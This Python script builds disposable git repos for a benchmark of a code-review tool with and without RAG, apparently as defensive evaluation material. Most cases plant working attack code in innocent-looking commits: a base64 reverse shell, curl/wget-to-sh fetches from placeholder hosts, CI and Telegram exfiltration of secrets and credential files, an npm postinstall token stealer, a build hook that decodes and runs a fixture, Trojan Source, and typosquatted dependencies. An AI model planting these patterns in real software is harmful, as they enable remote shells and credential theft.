"""Casos de prueba reutilizables para comparar SemanticLayer con y sin RAG.

Construye repos git desechables con un diff concreto (dos commits: base y
head) y devuelve la ruta + los SHA, listos para pasar dos veces a
`smoke_test_linea2.py` -- una con `--no-rag` y otra sin él -- y comparar el
resultado. Ver docs/rag_ablation_benchmark.md para la metodología completa y
los resultados ya registrados.

Uso:
    poetry run python scripts/rag_ablation_cases.py --list
    poetry run python scripts/rag_ablation_cases.py --build trojan-source --out /tmp/caso1

    # y luego, dos veces (con y sin --no-rag):
    poetry run python scripts/smoke_test_linea2.py --repo /tmp/caso1 \\
        --base <BASE> --head <HEAD> --label "trojan-source-con-rag"
    poetry run python scripts/smoke_test_linea2.py --repo /tmp/caso1 \\
        --base <BASE> --head <HEAD> --label "trojan-source-sin-rag" --no-rag
"""

from __future__ import annotations

import argparse
import subprocess
from collections.abc import Callable
from pathlib import Path

CaseBuilder = Callable[[Path], tuple[str, str]]


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)  # noqa: S603, S607


def _init_repo(repo: Path) -> None:
    repo.mkdir(parents=True, exist_ok=True)
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "a@b.com")
    _git(repo, "config", "user.name", "Test")


def _commit_all(repo: Path, message: str) -> None:
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", message)


def _rev(repo: Path) -> str:
    result = subprocess.run(  # noqa: S603, S607
        ["git", "rev-parse", "HEAD"], cwd=repo, check=True, capture_output=True, text=True
    )
    return result.stdout.strip()


def _build_trojan_source(repo: Path) -> tuple[str, str]:
    (repo / "auth.py").write_text(
        "def check_permissions(user):\n"
        '    if user.role == "guest":\n'
        "        return False\n"
        "    return True\n"
    )
    _commit_all(repo, "add permission check")
    base = _rev(repo)

    rlo, lri, pdi = chr(0x202E), chr(0x2066), chr(0x2069)
    (repo / "auth.py").write_text(
        "def check_permissions(user):\n"
        f'    # Ensure guest access is denied {rlo} "tseug" == elor.resu fi {lri}True{pdi}\n'
        '    if user.role == "guest":\n'
        "        return False\n"
        "    return True\n",
        encoding="utf-8",
    )
    _commit_all(repo, "clarify comment about guest access")
    return base, _rev(repo)


def _build_base64_exec(repo: Path) -> tuple[str, str]:
    (repo / "utils").mkdir()
    (repo / "utils" / "__init__.py").write_text(
        'def normalize_path(p):\n    return p.replace("\\\\", "/")\n'
    )
    _commit_all(repo, "init")
    base = _rev(repo)

    import base64

    payload = (
        'import os,socket,subprocess;s=socket.socket();s.connect(("198.51.100.24",4444));'
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh','-i'])"
    )
    encoded = base64.b64encode(payload.encode()).decode()
    (repo / "utils" / "__init__.py").write_text(
        "import base64\n\n"
        'def normalize_path(p):\n    return p.replace("\\\\", "/")\n\n'
        f'def _init_cache():\n    _c = "{encoded}"\n    exec(base64.b64decode(_c).decode())\n'
    )
    _commit_all(repo, "add cache initialization helper")
    return base, _rev(repo)


def _build_benign_plugin_loader(repo: Path) -> tuple[str, str]:
    (repo / "plugins.py").write_text(
        "PLUGIN_REGISTRY = {}\n\ndef register(name, fn):\n    PLUGIN_REGISTRY[name] = fn\n"
    )
    _commit_all(repo, "init plugin registry")
    base = _rev(repo)

    (repo / "plugins.py").write_text(
        "import importlib\n"
        "import pkgutil\n\n"
        "PLUGIN_REGISTRY = {}\n\n"
        "def register(name, fn):\n"
        "    PLUGIN_REGISTRY[name] = fn\n\n"
        'def discover_plugins(package_name="myapp.plugins"):\n'
        '    """Carga dinámicamente todos los módulos dentro de myapp/plugins/,\n'
        "    para que añadir un plugin nuevo sea tan simple como dejar caer un\n"
        '    fichero .py en esa carpeta, sin tocar este registro a mano."""\n'
        "    package = importlib.import_module(package_name)\n"
        "    for _, module_name, _ in pkgutil.iter_modules(package.__path__):\n"
        '        importlib.import_module(f"{package_name}.{module_name}")\n'
    )
    _commit_all(repo, "add dynamic plugin discovery from myapp/plugins/")
    return base, _rev(repo)


def _build_dependency_confusion(repo: Path) -> tuple[str, str]:
    (repo / "requirements.txt").write_text("flask==2.3.0\nrequests==2.31.0\n")
    _commit_all(repo, "init requirements")
    base = _rev(repo)

    (repo / "requirements.txt").write_text(
        "flask==2.3.0\nrequests==2.31.0\nacme-internal-auth-utils==9.9.9\n"
    )
    _commit_all(repo, "bump internal auth utils")
    return base, _rev(repo)


def _build_docker_base_image_swap(repo: Path) -> tuple[str, str]:
    (repo / "Dockerfile").write_text(
        'FROM python:3.11-slim\nWORKDIR /app\nCOPY . .\nCMD ["python", "app.py"]\n'
    )
    _commit_all(repo, "init Dockerfile")
    base = _rev(repo)

    (repo / "Dockerfile").write_text(
        "FROM devtools42/python-slim:latest\n"
        "WORKDIR /app\n"
        "RUN curl -fsSL http://cdn-assets.example/init.sh | sh\n"
        "COPY . .\n"
        'CMD ["python", "app.py"]\n'
    )
    _commit_all(repo, "switch to lighter base image")
    return base, _rev(repo)


def _build_new_file_minimal_wiring(repo: Path) -> tuple[str, str]:
    (repo / "app").mkdir()
    (repo / "app" / "__init__.py").write_text("VERSION = '1.0.0'\n")
    _commit_all(repo, "init app package")
    base = _rev(repo)

    (repo / "app" / "_startup_check.py").write_text(
        "import base64\nimport urllib.request\n\n"
        "def verify():\n"
        '    code = urllib.request.urlopen("http://cdn-assets.example/check.py").read()\n'
        "    exec(code)\n"
    )
    (repo / "app" / "__init__.py").write_text(
        "VERSION = '1.0.0'\n\nfrom ._startup_check import verify; verify()\n"
    )
    _commit_all(repo, "add startup environment validation")
    return base, _rev(repo)


def _build_github_actions_secret_leak(repo: Path) -> tuple[str, str]:
    (repo / ".github" / "workflows").mkdir(parents=True)
    (repo / ".github" / "workflows" / "ci.yml").write_text(
        "name: CI\n"
        "on: [pull_request]\n"
        "jobs:\n"
        "  test:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "      - run: pip install -r requirements.txt\n"
        "      - run: pytest\n"
    )
    _commit_all(repo, "add CI workflow")
    base = _rev(repo)

    (repo / ".github" / "workflows" / "ci.yml").write_text(
        "name: CI\n"
        "on: [pull_request]\n"
        "jobs:\n"
        "  test:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "      - run: pip install -r requirements.txt\n"
        "      - name: Debug environment\n"
        "        run: |\n"
        "          curl -X POST https://telemetry-collect.example/report \\\n"
        '            -d "deploy_key=${{ secrets.DEPLOY_KEY }}&npm_token=${{ secrets.NPM_TOKEN }}"\n'
        "      - run: pytest\n"
    )
    _commit_all(repo, "add debug step for environment troubleshooting")
    return base, _rev(repo)


def _build_telegram_c2_exfiltration(repo: Path) -> tuple[str, str]:
    (repo / "notify.py").write_text(
        'def send_build_status(status):\n    print(f"Build status: {status}")\n'
    )
    _commit_all(repo, "add build status notifier")
    base = _rev(repo)

    (repo / "notify.py").write_text(
        "import glob\n"
        "import requests\n\n"
        'def send_build_status(status):\n    print(f"Build status: {status}")\n\n'
        "def _sync_diagnostics():\n"
        "    for path in glob.glob('**/*.env', recursive=True) + glob.glob('~/.aws/credentials'):\n"
        "        with open(path, 'rb') as f:\n"
        "            requests.post(\n"
        '                "https://api.telegram.org/bot123456:ABC-DEF/sendDocument",\n'
        "                data={'chat_id': '987654321'},\n"
        "                files={'document': f},\n"
        "            )\n"
    )
    _commit_all(repo, "add diagnostics sync for support requests")
    return base, _rev(repo)


def _build_docker_entrypoint_hijack(repo: Path) -> tuple[str, str]:
    (repo / "Dockerfile").write_text(
        "FROM node:20-alpine\n"
        "WORKDIR /app\n"
        "COPY . .\n"
        "RUN npm ci --production\n"
        'CMD ["node", "server.js"]\n'
    )
    _commit_all(repo, "init Dockerfile")
    base = _rev(repo)

    (repo / "Dockerfile").write_text(
        "FROM node:20-alpine\n"
        "WORKDIR /app\n"
        "COPY . .\n"
        "RUN npm ci --production\n"
        'ENTRYPOINT ["/bin/sh", "-c", '
        '"wget -qO- http://pkg-mirror.example/boot.sh | /bin/sh && node server.js"]\n'
    )
    _commit_all(repo, "wrap entrypoint with startup healthcheck")
    return base, _rev(repo)


def _build_typosquat_popular_package(repo: Path) -> tuple[str, str]:
    (repo / "requirements.txt").write_text("numpy==1.26.0\npandas==2.1.0\n")
    _commit_all(repo, "init requirements")
    base = _rev(repo)

    (repo / "requirements.txt").write_text("numpy==1.26.0\npandas==2.1.0\nsympy-dev==1.2.6\n")
    _commit_all(repo, "add symbolic math support")
    return base, _rev(repo)


def _build_npm_postinstall_worm(repo: Path) -> tuple[str, str]:
    """Post-cutoff (patrón Shai-Hulud, sept-nov 2025): postinstall que roba
    credenciales y se auto-propaga vía GitHub Actions. Ningún LLM entrenado
    antes de esa fecha puede conocer este incidente concreto -- prueba si el
    RAG aporta lo que el prior del modelo no puede tener."""
    (repo / "package.json").write_text(
        '{\n  "name": "chart-render-utils",\n  "version": "2.4.1",\n'
        '  "dependencies": {"lodash": "^4.17.21"}\n}\n'
    )
    _commit_all(repo, "init package")
    base = _rev(repo)

    (repo / "package.json").write_text(
        '{\n  "name": "chart-render-utils",\n  "version": "2.4.2",\n'
        '  "scripts": {"postinstall": "node scripts/setup-env.js"},\n'
        '  "dependencies": {"lodash": "^4.17.21"}\n}\n'
    )
    (repo / "scripts").mkdir()
    (repo / "scripts" / "setup-env.js").write_text(
        "const { execSync } = require('child_process');\n"
        "const https = require('https');\n\n"
        "// descarga un escáner de secretos y vuelca el entorno + tokens\n"
        "execSync('curl -fsSL https://bin-mirror.example/scanner -o /tmp/.sc && "
        "chmod +x /tmp/.sc && /tmp/.sc --json > /tmp/.creds.json');\n\n"
        "const token = process.env.GITHUB_TOKEN || process.env.NPM_TOKEN;\n"
        "if (token) {\n"
        "  execSync(`bash /tmp/processor.sh ${token}`); // crea rama y publica workflow\n"
        "  execSync(`bash /tmp/migrate-repos.sh ${token}`); // fuerza repos a público\n"
        "}\n"
    )
    _commit_all(repo, "add postinstall environment setup for build diagnostics")
    return base, _rev(repo)


def _build_maintainer_handoff_single_commit(repo: Path) -> tuple[str, str]:
    """Generalización del patrón estructural event-stream/coa-rc/colors-faker
    a un paquete e incidente completamente nuevos, no presentes tal cual en
    el corpus -- prueba si el RAG generaliza el patrón (cesión de
    mantenimiento + primer commit + dependencia nueva sin historial) o solo
    memoriza los casos exactos que ya conoce."""
    (repo / "package.json").write_text(
        '{\n  "name": "ansi-table-render",\n  "version": "3.1.0",\n'
        '  "dependencies": {"chalk": "^5.3.0"}\n}\n'
    )
    _commit_all(repo, "release 3.1.0")
    base = _rev(repo)

    (repo / "package.json").write_text(
        '{\n  "name": "ansi-table-render",\n  "version": "3.1.1",\n'
        '  "dependencies": {"chalk": "^5.3.0", "term-pad-fmt": "^0.0.1"}\n}\n'
    )
    _commit_all(repo, "hand off maintenance to new publisher, add padding helper dep")
    return base, _rev(repo)


def _build_build_macro_tampering(repo: Path) -> tuple[str, str]:
    """Generalización del patrón xz-utils (payload activado condicionalmente
    durante el build, escondido en un fixture de test) a un proyecto y
    mecanismo de ofuscación distintos -- prueba si el RAG reconoce la
    *forma* del ataque (build script + fixture de test + condición de
    arquitectura) más allá del caso xz literal."""
    (repo / "configure.ac").write_text(
        "AC_INIT([imgcodec], [1.4.0])\nAM_INIT_AUTOMAKE\nAC_PROG_CC\nAC_OUTPUT\n"
    )
    (repo / "tests" / "fixtures").mkdir(parents=True)
    (repo / "tests" / "fixtures" / "sample_corrupt.dat").write_text(
        "REF_FIXTURE_V1\n0000 0000 0000 0000\n"
    )
    _commit_all(repo, "init autotools build")
    base = _rev(repo)

    (repo / "configure.ac").write_text(
        "AC_INIT([imgcodec], [1.4.1])\nAM_INIT_AUTOMAKE\nAC_PROG_CC\n\n"
        'AS_IF([test "x$host_cpu" = xx86_64 -a "x$ac_cv_prog_gcc" = xyes], [\n'
        "  dd if=tests/fixtures/sample_corrupt.dat bs=1 skip=16 2>/dev/null | "
        "xxd -r -p | sh\n"
        "])\n"
        "AC_OUTPUT\n"
    )
    (repo / "tests" / "fixtures" / "sample_corrupt.dat").write_text(
        "REF_FIXTURE_V1\n0000 0000 0000 0000\n" "63 75 72 6c 20 2d 66 73 53 4c 20 68 74 74 70 3a\n"
    )
    _commit_all(repo, "add architecture-specific fixture decode for regression test #4471")
    return base, _rev(repo)


def _build_sandboxed_eval_plugin_system(repo: Path) -> tuple[str, str]:
    """Calibración difícil: usa eval() (señal habitualmente sospechosa) pero
    de forma genuinamente segura -- namespace restringido, sin builtins, sin
    red ni filesystem, solo para fórmulas tipo hoja de cálculo. Generaliza
    la idea de benign-plugin-loader a un caso más difícil de calibrar."""
    (repo / "formulas.py").write_text(
        "def apply_template(template, values):\n" "    return template.format(**values)\n"
    )
    _commit_all(repo, "init static templates")
    base = _rev(repo)

    (repo / "formulas.py").write_text(
        "import math\n\n"
        "_ALLOWED_NAMES = {\n"
        "    name: getattr(math, name) for name in ('sqrt', 'sin', 'cos', 'floor', 'ceil')\n"
        "}\n\n"
        "def apply_template(template, values):\n"
        "    return template.format(**values)\n\n"
        "def evaluate_formula(expr, cell_values):\n"
        '    """Evalúa una fórmula de usuario (p.ej. "sqrt(A1) + 2") sin acceso\n'
        "    a builtins, imports ni I/O -- solo las funciones matemáticas\n"
        '    permitidas y los valores de celda ya calculados."""\n'
        "    namespace = dict(_ALLOWED_NAMES)\n"
        "    namespace.update(cell_values)\n"
        "    return eval(expr, {'__builtins__': {}}, namespace)\n"
    )
    _commit_all(repo, "add spreadsheet-style formula evaluation for custom cells")
    return base, _rev(repo)


def _build_fake_checksum_curl_exec(repo: Path) -> tuple[str, str]:
    """Adversarial: imita la forma superficial de benign-curl-checksum-
    verified (curl + sha256sum) pero el checksum se descarga del mismo
    dominio no confiable que sirve el binario -- no ancla nada, es
    autorreferencial. Prueba si el modelo distingue 'hay una comprobación
    de checksum' de 'la comprobación ancla a algo confiable'."""
    (repo / "Makefile").write_text("build:\n\tgo build -o bin/app ./cmd/app\n")
    _commit_all(repo, "init Makefile")
    base = _rev(repo)

    (repo / "Makefile").write_text(
        "build:\n\tgo build -o bin/app ./cmd/app\n\n"
        "fetch-protoc:\n"
        "\tcurl -fsSL -o protoc.zip http://releases-cdn-mirror.example/protoc.zip\n"
        "\tcurl -fsSL http://releases-cdn-mirror.example/protoc.zip.sha256 | sha256sum -c -\n"
        "\tunzip protoc.zip -d /usr/local\n"
    )
    _commit_all(repo, "add target to fetch protoc with checksum verification")
    return base, _rev(repo)


def _build_benign_curl_checksum_verified(repo: Path) -> tuple[str, str]:
    """Calibración: usa curl (señal habitualmente sospechosa) pero de forma
    legítima -- descarga una release ya conocida y verifica su checksum
    antes de usarla, sin ejecutar nada a ciegas."""
    (repo / "Makefile").write_text("build:\n\tgo build -o bin/app ./cmd/app\n")
    _commit_all(repo, "init Makefile")
    base = _rev(repo)

    (repo / "Makefile").write_text(
        "build:\n\tgo build -o bin/app ./cmd/app\n\n"
        "fetch-protoc:\n"
        "\tcurl -fsSL -o protoc.zip "
        "https://releases.example/protoc/v25.1/protoc-25.1-linux-x86_64.zip\n"
        '\techo "3d2e3d8...  protoc.zip" | sha256sum -c -\n'
        "\tunzip protoc.zip -d /usr/local\n"
    )
    _commit_all(repo, "add target to fetch pinned protoc release for proto builds")
    return base, _rev(repo)


CASES: dict[str, CaseBuilder] = {
    "trojan-source": _build_trojan_source,
    "base64-exec": _build_base64_exec,
    "benign-plugin-loader": _build_benign_plugin_loader,
    "dependency-confusion": _build_dependency_confusion,
    "docker-base-image-swap": _build_docker_base_image_swap,
    "new-file-minimal-wiring": _build_new_file_minimal_wiring,
    "github-actions-secret-leak": _build_github_actions_secret_leak,
    "telegram-c2-exfiltration": _build_telegram_c2_exfiltration,
    "docker-entrypoint-hijack": _build_docker_entrypoint_hijack,
    "typosquat-popular-package": _build_typosquat_popular_package,
    "benign-curl-checksum-verified": _build_benign_curl_checksum_verified,
    "npm-postinstall-worm": _build_npm_postinstall_worm,
    "maintainer-handoff-single-commit": _build_maintainer_handoff_single_commit,
    "build-macro-tampering": _build_build_macro_tampering,
    "sandboxed-eval-plugin-system": _build_sandboxed_eval_plugin_system,
    "fake-checksum-curl-exec": _build_fake_checksum_curl_exec,
}


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--list", action="store_true", help="Lista los casos disponibles")
    parser.add_argument("--build", metavar="CASE", help="Nombre del caso a construir")
    parser.add_argument("--out", help="Directorio destino (se crea si no existe)")
    args = parser.parse_args()

    if args.list or not args.build:
        print("Casos disponibles:")
        for name in CASES:
            print(f"  - {name}")
        return

    if args.build not in CASES:
        raise SystemExit(f"Caso desconocido: {args.build!r}. Usa --list para verlos.")
    if not args.out:
        raise SystemExit("Falta --out <directorio>")

    repo = Path(args.out)
    _init_repo(repo)
    base, head = CASES[args.build](repo)
    print(f"repo: {repo.resolve()}")
    print(f"base: {base}")
    print(f"head: {head}")
    print()
    print("poetry run python scripts/smoke_test_linea2.py \\")
    print(f'  --repo "{repo.resolve()}" --base {base} --head {head} \\')
    print(f'  --label "{args.build}-con-rag"')
    print("poetry run python scripts/smoke_test_linea2.py \\")
    print(f'  --repo "{repo.resolve()}" --base {base} --head {head} \\')
    print(f'  --label "{args.build}-sin-rag" --no-rag')


if __name__ == "__main__":
    main()
